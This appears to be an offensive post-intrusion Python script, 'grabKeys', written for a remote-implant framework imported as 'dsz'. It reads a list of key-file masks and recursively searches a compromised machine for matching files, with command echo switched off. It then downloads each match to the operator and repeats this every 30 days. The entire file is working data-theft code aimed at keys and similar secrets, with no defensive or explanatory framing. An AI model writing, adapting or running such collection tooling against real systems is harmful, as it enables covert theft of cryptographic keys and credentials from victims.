
import ops
import ops.marker
import ops.dszcmd
from util.DSZPyLogger import DSZPyLogger
import dsz
import dsz.cmd
import dsz.control
import dsz.ui
import traceback
import sys
import os
import datetime
RUN_PERIOD = datetime.timedelta(30, 0, 0)
GRABKEYS_MAX = 2000000

def getMaskList():
    listfile = open(os.path.join(ops.RESDIR, 'Ops', 'Data', 'grabKeyMasks.txt'), 'r')
    masklist = []
    for line in listfile:
        if (line.strip() != ''):
            addval = line.strip()
            if (addval[(-1)] == '\n'):
                addval = addval[:(-1)]
            masklist.append(addval)
    listfile.close()
    return masklist

def getKeys(mask, since):
    dsz_date = ('%d-%d-%d' % (since.year, since.month, since.day))
    command = ('dir -mask %s -path * -recursive' % mask)
    if (since > datetime.datetime.min):
        command += (' -time created -after %s' % dsz_date)
    dsz.control.echo.Off()
    if (not dsz.cmd.Run(command, dsz.RUN_FLAG_RECORD)):
        raise Exception(('Dir for %s failed' % mask))
    dsz.control.echo.On()
    totalsize = 0
    getlist = []
    for dirresult in ops.dszcmd.get('DirItem', dsz.TYPE_OBJECT):
        dirname = ops.dszcmd.objget(dirresult, 'path')[0]
        for fileresult in ops.dszcmd.objget(dirresult, 'FileItem::name', dsz.TYPE_STRING):
            getlist.append(('%s\\%s' % (dirname, fileresult)))
            totalsize += int(ops.dszcmd.objget(dirresult, 'FileItem::size', dsz.TYPE_INT)[0])
    if (totalsize > GRABKEYS_MAX):
        answer = dsz.ui.Prompt(('grabKeys needs to get %d bytes for mask %s, is that okay?' % (totalsize, mask)))
        if (not answer):
            return
    print ('%d bytes to get for mask %s' % (totalsize, mask))
    for fullpath in getlist:
        command = ('get "%s"' % fullpath)
        dsz.cmd.Run(command, dsz.RUN_FLAG_RECORD)

def main():
    last_run = ops.marker.get('GRABKEYS')['last_date']
    if ((datetime.datetime.now() - last_run) <= RUN_PERIOD):
        ops.info(('grabKeys was run in the last %s, not running again' % str(RUN_PERIOD)))
        return
    answer = dsz.ui.Prompt(('Do you want to run grabKeys?  Last run was %s' % last_run))
    if (not answer):
        return
    masks = getMaskList()
    for mask in masks:
        try:
            getKeys(mask, last_run)
        except:
            ops.error(('Failed to get keys with mask "%s"' % mask))
            traceback.print_exc()
    ops.info('All masks completed or at least attempted, marking grabKeys done')
    ops.marker.set('GRABKEYS')
if (__name__ == '__main__'):
    try:
        main()
    except:
        ops.error('Grabkeys had a major failure')
        traceback.print_exc()
        problemText = str(sys.exc_info())
        dszLogger = DSZPyLogger()
        toolLog = dszLogger.getLogger('grabkeys')
        toolLog.log(10, problemText)